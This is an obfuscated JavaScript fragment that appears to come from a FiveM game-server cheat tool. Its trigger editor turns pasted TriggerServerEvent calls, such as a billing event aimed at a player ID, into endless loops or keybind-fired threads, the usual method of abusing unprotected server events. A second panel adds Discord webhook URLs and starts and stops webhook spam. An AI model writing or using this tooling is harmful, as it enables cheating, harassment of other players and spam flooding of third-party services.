    console.error("Error attaching images to items:", _0x5ed840);
    return _0x330b08;
  }
}
function handleResourceSearch(_0x179614) {
  try {
    const _0x132d2e = _0x179614.target.value.toLowerCase().trim();
    const _0x2e98b8 = document.getElementById('resource-tree');
    if (!_0x2e98b8 || !appState.selectedFiles || appState.selectedFiles.length === 0x0) {
      return;
    }
    if (_0x132d2e === '') {
      updateResourceExplorer(appState.selectedFiles);
      return;
    }
    const _0x1031ec = appState.selectedFiles.filter(_0x564a24 => {
      const _0x3ccd31 = _0x564a24.name.toLowerCase();
      const _0x1a1623 = _0x564a24.webkitRelativePath.toLowerCase();
      return _0x3ccd31.includes(_0x132d2e) || _0x1a1623.includes(_0x132d2e);
    });
    updateResourceExplorer(_0x1031ec, _0x132d2e);
  } catch (_0x5a9624) {
    console.error("Error handling resource search:", _0x5a9624);
  }
}
function handleLoopTrigger() {
  try {
    const _0x5f2ec1 = document.getElementById('editor-resource-name').value.trim() || "resource";
    const _0x1ca456 = document.getElementById("editor-loop-delay").value.trim() || '1000';
    const _0x79f6f = document.getElementById("editor-trigger-text").value.trim();
    console.log("Loop Trigger Debug:", {
      'resourceName': _0x5f2ec1,
      'loopDelay': _0x1ca456,
      'triggerText': _0x79f6f
    });
    if (!_0x79f6f) {
      showNotification("Please paste a trigger in the editor area", "error");
      return;
    }
    const _0x3ebf06 = transformTriggerToLoop(_0x79f6f, _0x5f2ec1, _0x1ca456);
    console.log("Transformed Loop Trigger:", _0x3ebf06);
    document.getElementById('editor-trigger-text').value = _0x3ebf06;
    showNotification("Trigger transformed into loop for " + _0x5f2ec1 + " with " + _0x1ca456 + "ms delay", "success");
  } catch (_0x433c05) {
    console.error("Error transforming trigger to loop:", _0x433c05);
    showNotification("Error transforming trigger to loop: " + _0x433c05.message, "error");
  }
}
function handleKeybindTrigger() {
  try {
    const _0x52bcad = document.getElementById('editor-resource-name').value.trim() || "resource";
    const _0x4090e3 = document.getElementById("editor-keybind").value.trim();
    const _0x5a5d3a = document.getElementById("editor-trigger-text").value.trim();
    console.log("Keybind Trigger Debug:", {
      'resourceName': _0x52bcad,
      'keybind': _0x4090e3,
      'triggerText': _0x5a5d3a
    });
    if (!_0x4090e3) {
      showNotification("Please enter a keybind", "error");
      return;
    }
    if (!_0x5a5d3a) {
      showNotification("Please paste a trigger in the editor area", 'error');
      return;
    }
    const _0x4a310b = transformTriggerToKeybind(_0x5a5d3a, _0x52bcad, _0x4090e3);
    console.log("Transformed Keybind Trigger:", _0x4a310b);
    document.getElementById("editor-trigger-text").value = _0x4a310b;
    showNotification("Trigger transformed into keybind for " + _0x52bcad + " with key " + _0x4090e3.toUpperCase(), "success");
  } catch (_0x5b0315) {
    console.error("Error transforming trigger to keybind:", _0x5b0315);
    showNotification("Error transforming trigger to keybind: " + _0x5b0315.message, "error");
  }
}
function transformTriggerToLoop(_0x2b5d22, _0x7e0e0, _0x4df21f) {
  try {
    console.log("Starting loop transformation with:", {
      'triggerText': _0x2b5d22,
      'resourceName': _0x7e0e0,
      'delay': _0x4df21f
    });
    let _0x26aa78 = _0x2b5d22;
    _0x26aa78 = _0x26aa78.replace(/Citizen\.CreateThread\s*\(\s*function\s*\(\s*\)\s*\{[\s\S]*?\}\s*\)\s*;?\s*$/g, '');
    _0x26aa78 = _0x26aa78.replace(/while\s+true\s+do[\s\S]*?end/g, '');
    _0x26aa78 = _0x26aa78.replace(/Citizen\.Wait\s*\(\s*\d+\s*\)\s*;?\s*$/g, '');
    _0x26aa78 = _0x26aa78.trim();
    console.log("Cleaned trigger text:", _0x26aa78);
    const _0x43fecc = _0x26aa78.split("\n");
    const _0x5145cd = _0x43fecc.map(_0x44594e => _0x44594e.trim()).filter(_0x10df68 => _0x10df68.length > 0x0);
    console.log("Cleaned lines:", _0x5145cd);
    if (_0x5145cd.length === 0x0) {
      _0x5145cd.push(_0x2b5d22.trim());
    }
    const _0x536bad = "-- Loop Trigger for " + _0x7e0e0 + "\n-- Delay: " + _0x4df21f + "ms\n\nCitizen.CreateThread(function()\n    while true do\n        " + _0x5145cd.join("\n        ") + "\n        Citizen.Wait(" + _0x4df21f + ")\n    end\nend)";
    console.log("Generated loop code:", _0x536bad);
    return _0x536bad;
  } catch (_0x57cc08) {
    console.error("Error transforming trigger to loop:", _0x57cc08);
    return "-- Error transforming trigger to loop\n-- Error: " + _0x57cc08.message + "\n-- Original trigger:\n" + _0x2b5d22 + "\n\n-- Please check your trigger syntax";
  }
}
function transformTriggerToKeybind(_0x11bc73, _0x2473af, _0x10fa1f) {
  try {
    console.log("Starting keybind transformation with:", {
      'triggerText': _0x11bc73,
      'resourceName': _0x2473af,
      'keybind': _0x10fa1f
    });
    let _0x188d87 = _0x11bc73;
    _0x188d87 = _0x188d87.replace(/Citizen\.CreateThread\s*\(\s*function\s*\(\s*\)\s*\{[\s\S]*?\}\s*\)\s*;?\s*$/g, '');
    _0x188d87 = _0x188d87.replace(/while\s+true\s+do[\s\S]*?end/g, '');
    _0x188d87 = _0x188d87.replace(/if\s+IsControlJustPressed\s*\(\s*0\s*,\s*\d+\s*\)\s+then[\s\S]*?end/g, '');
    _0x188d87 = _0x188d87.replace(/Citizen\.Wait\s*\(\s*0\s*\)\s*;?\s*$/g, '');
    _0x188d87 = _0x188d87.trim();
    console.log("Cleaned trigger text:", _0x188d87);
    const _0x26dde5 = _0x188d87.split("\n");
    const _0x2b8c94 = _0x26dde5.map(_0x170832 => _0x170832.trim()).filter(_0x1f5775 => _0x1f5775.length > 0x0);
    console.log("Cleaned lines:", _0x2b8c94);
    if (_0x2b8c94.length === 0x0) {
      _0x2b8c94.push(_0x11bc73.trim());
    }
    const _0x4b8591 = getKeyCode(_0x10fa1f);
    console.log("Key code for", _0x10fa1f, ':', _0x4b8591);
    const _0x21d39a = "-- Keybind Trigger for " + _0x2473af + "\n-- Key: " + _0x10fa1f.toUpperCase() + " (Code: " + _0x4b8591 + ")\n\nCitizen.CreateThread(function()\n    while true do\n        Citizen.Wait(0)\n        \n        if IsControlJustPressed(0, " + _0x4b8591 + ") then\n            " + _0x2b8c94.join("\n            ") + "\n        end\n    end\nend)";
    console.log("Generated keybind code:", _0x21d39a);
    return _0x21d39a;
  } catch (_0x40e2dd) {
    console.error("Error transforming trigger to keybind:", _0x40e2dd);
    return "-- Error transforming trigger to keybind\n-- Error: " + _0x40e2dd.message + "\n-- Original trigger:\n" + _0x11bc73 + "\n\n-- Please check your trigger syntax";
  }
}
function getKeyCode(_0x53474e) {
  const _0x528c08 = {
    'E': '38',
    'F': '23',
    'G': '47',
    'H': '74',
    'I': '73',
    'J': '74',
    'K': "311",
    'L': "182",
    'M': '244',
    'N': "249",
    'O': "199",
    'P': "199",
    'Q': '44',
    'R': '45',
    'S': '33',
    'T': "245",
    'U': "303",
    'V': '47',
    'W': '32',
    'X': '73',
    'Y': "246",
    'Z': '20',
    '1': "157",
    '2': "158",
    '3': "160",
    '4': "164",
    '5': '165',
    '6': "159",
    '7': "161",
    '8': '162',
    '9': '163',
    '0': '164',
    'ENTER': "191",
    'SPACE': '22',
    'SHIFT': '21',
    'CTRL': '36',
    'ALT': '19',
    'TAB': '37',
    'ESC': "322",
    'BACKSPACE': "194",
    'DELETE': "178",
    'INSERT': "121",
    'HOME': "212",
    'END': "213",
    'PAGEUP': '10',
    'PAGEDOWN': '11',
    'ARROWUP': "172",
    'ARROWDOWN': "173",
    'ARROWLEFT': "174",
    'ARROWRIGHT': '175'
  };
  const _0x27f0fc = _0x53474e.toUpperCase();
  return _0x528c08[_0x27f0fc] || '38';
}
function testEditor() {
  console.log("Testing Editor functionality...");
  console.log("Test Loop Trigger:");
  const _0x3fb17a = transformTriggerToLoop("TriggerServerEvent('esx_billing:sendBill', playerId, 1000)", "esx_billing", '1000');
  console.log(_0x3fb17a);
  console.log("Test Keybind Trigger:");
  const _0x2486a8 = transformTriggerToKeybind("TriggerServerEvent('esx_billing:sendBill', playerId, 1000)", "esx_billing", 'E');
  console.log(_0x2486a8);
  return {
    'loopResult': _0x3fb17a,
    'keybindResult': _0x2486a8
  };
}
function debugEditorInputs() {
  const _0x25c022 = document.getElementById('editor-resource-name')?.['value'];
  const _0x368306 = document.getElementById('editor-keybind')?.["value"];
  const _0x2d96d5 = document.getElementById('editor-loop-delay')?.["value"];
  const _0xb38e30 = document.getElementById("editor-trigger-text")?.['value'];
  console.log("Current Editor Inputs:", {
    'resourceName': _0x25c022,
    'keybind': _0x368306,
    'loopDelay': _0x2d96d5,
    'triggerText': _0xb38e30,
    'resourceNameElement': !!document.getElementById("editor-resource-name"),
    'keybindElement': !!document.getElementById("editor-keybind"),
    'loopDelayElement': !!document.getElementById("editor-loop-delay"),
    'triggerTextElement': !!document.getElementById("editor-trigger-text")
  });
  return {
    'resourceName': _0x25c022,
    'keybind': _0x368306,
    'loopDelay': _0x2d96d5,
    'triggerText': _0xb38e30
  };
}
function testEditorFunction() {
  try {
    console.log("Testing Editor functionality...");
    const _0x39e76a = document.getElementById('editor-resource-name');
    const _0x5d9c43 = document.getElementById("editor-keybind");
    const _0x1f0c86 = document.getElementById("editor-loop-delay");
    const _0x529c6d = document.getElementById('editor-trigger-text');
    if (_0x39e76a) {
      _0x39e76a.value = '';
    }
    if (_0x5d9c43) {
      _0x5d9c43.value = 'E';
    }
    if (_0x1f0c86) {
      _0x1f0c86.value = '';
    }
    if (_0x529c6d) {
      _0x529c6d.value = "TriggerServerEvent('esx_billing:sendBill', playerId, 1000)";
    }
    console.log("Fields populated with test data (empty resource name and loop delay to show defaults)");
    console.log("Testing loop transformation with defaults...");
    const _0x480c06 = transformTriggerToLoop("TriggerServerEvent('esx_billing:sendBill', playerId, 1000)", "resource", "1000");
    console.log("Loop result:", _0x480c06);
    console.log("Testing keybind transformation with defaults...");
    const _0x2f43d3 = transformTriggerToKeybind("TriggerServerEvent('esx_billing:sendBill', playerId, 1000)", "resource", 'E');
    console.log("Keybind result:", _0x2f43d3);
    showNotification("Editor test completed! Check console for results. (Defaults: resource name=\"resource\", loop delay=1000ms)", 'success');
    return {
      'loopResult': _0x480c06,
      'keybindResult': _0x2f43d3
    };
  } catch (_0x1e4bd9) {
    console.error("Error in test function:", _0x1e4bd9);
    showNotification("Test failed: " + _0x1e4bd9.message, "error");
  }
}
function setupSpammerEventListeners() {
  try {
    console.log("Setting up Spammer event listeners...");
    const _0x426b7c = document.querySelector(".send-btn");
    const _0x494331 = document.querySelector(".clear-btn");
    const _0x3e7b23 = document.querySelector(".start-spam-btn");
    const _0x3cb74a = document.querySelector('.stop-spam-btn');
    const _0x39f9db = document.getElementById('add-webhook-btn');
    const _0x3129d8 = document.getElementById("manual-webhook-url");
    if (_0x426b7c) {
      _0x426b7c.replaceWith(_0x426b7c.cloneNode(true));
      const _0x429a13 = document.querySelector(".send-btn");
      _0x429a13.addEventListener('click', sendWebhookOnce);
      console.log("Send button event listener added");
    }
    if (_0x494331) {
      _0x494331.replaceWith(_0x494331.cloneNode(true));
      const _0x5b8308 = document.querySelector('.clear-btn');
      _0x5b8308.addEventListener("click", clearWebhookForm);
      console.log("Clear button event listener added");
    }
    if (_0x3e7b23) {
      _0x3e7b23.replaceWith(_0x3e7b23.cloneNode(true));
      const _0x1c0799 = document.querySelector(".start-spam-btn");
      _0x1c0799.addEventListener("click", startWebhookSpam);
      console.log("Start spam button event listener added");
    }
    if (_0x3cb74a) {
      _0x3cb74a.replaceWith(_0x3cb74a.cloneNode(true));
      const _0x250ddb = document.querySelector(".stop-spam-btn");
      _0x250ddb.addEventListener("click", stopWebhookSpam);
      console.log("Stop spam button event listener added");
    }
    if (_0x39f9db) {
      _0x39f9db.replaceWith(_0x39f9db.cloneNode(true));
      const _0x4067a8 = document.getElementById('add-webhook-btn');
      _0x4067a8.addEventListener("click", addManualWebhook);
      console.log("Add webhook button event listener added");
    }
    if (_0x3129d8) {
      _0x3129d8.replaceWith(_0x3129d8.cloneNode(true));
      const _0x327d5c = document.getElementById('manual-webhook-url');
      _0x327d5c.addEventListener("keypress", _0x1f12b5 => {
        if (_0x1f12b5.key === "Enter") {
          addManualWebhook();
        }
      });
      console.log("Manual webhook input event listener added");
    }
    const _0x3f6ebf = document.getElementById("delete-webhook-btn");
    if (_0x3f6ebf) {
      _0x3f6ebf.replaceWith(_0x3f6ebf.cloneNode(true));
      const _0x3384ee = document.getElementById("delete-webhook-btn");
      _0x3384ee.addEventListener("click", () => {
        const _0x1db722 = appState.selectedWebhooks;
        if (_0x1db722.length === 0x0) {
          showNotification("No webhooks selected to delete", "error");
          return;
        }
        if (confirm("Are you sure you want to delete " + _0x1db722.length + " webhook(s)? This action cannot be undone!")) {
          _0x1db722.forEach(_0x2418e0 => {
            deleteWebhook(_0x2418e0);
          });
        }
      });
      console.log("Delete webhook button event listener added");
    }
    console.log("Spammer event listeners setup complete");
  } catch (_0x43f90b) {
    console.error("Error setting up Spammer event listeners:", _0x43f90b);
  }
}
function testWebhookFunction() {
  try {
    console.log("Testing webhook functionality...");
    const _0x27d4af = document.getElementById("add-webhook-btn");
    const _0x3d6c2a = document.getElementById("manual-webhook-url");
    console.log("Webhook elements found:", {
      'addWebhookBtn': !!_0x27d4af,
      'manualWebhookInput': !!_0x3d6c2a
    });
    if (_0x27d4af) {
      console.log("Add webhook button exists");
    } else {
      console.error("Add webhook button not found!");
    }
    if (_0x3d6c2a) {
      console.log("Manual webhook input exists");
    } else {
      console.error("Manual webhook input not found!");
    }
    console.log("Testing addManualWebhook function...");
    const _0x4f90a6 = _0x3d6c2a ? _0x3d6c2a.value : '';
    if (_0x3d6c2a) {
      _0x3d6c2a.value = "https://discord.com/api/webhooks/test/test";
    }
    addManualWebhook();
    if (_0x3d6c2a) {
      _0x3d6c2a.value = _0x4f90a6;
    }
    showNotification("Webhook test completed! Check console for results.", "success");
  } catch (_0x1db431) {
    console.error("Error in webhook test function:", _0x1db431);
    showNotification("Webhook test failed: " + _0x1db431.message, "error");
  }
}
function setupEditorTabs() {
  try {
    console.log("Setting up editor tabs...");
    const _0x4cab60 = document.getElementById("editor-tab-trigger");
    const _0x9428d0 = document.getElementById("editor-trigger-content");
    console.log("Editor tab elements:", {
      'triggerTab': !!_0x4cab60,
      'triggerContent': !!_0x9428d0
    });
    if (_0x4cab60 && _0x9428d0) {
      const _0xeaaf8e = _0x4cab60.cloneNode(true);
      _0x4cab60.parentNode.replaceChild(_0xeaaf8e, _0x4cab60);
      _0xeaaf8e.addEventListener("click", () => {
        console.log("Trigger tab clicked");
        _0xeaaf8e.classList.add("active");
        _0x9428d0.classList.add("active");
        showNotification("Trigger Editor active", 'info');
      });
      console.log("Editor tabs setup complete");
    } else {
      console.error("Editor tab elements not found");
    }
  } catch (_0x1243a8) {
    console.error("Error setting up editor tabs:", _0x1243a8);
  }
}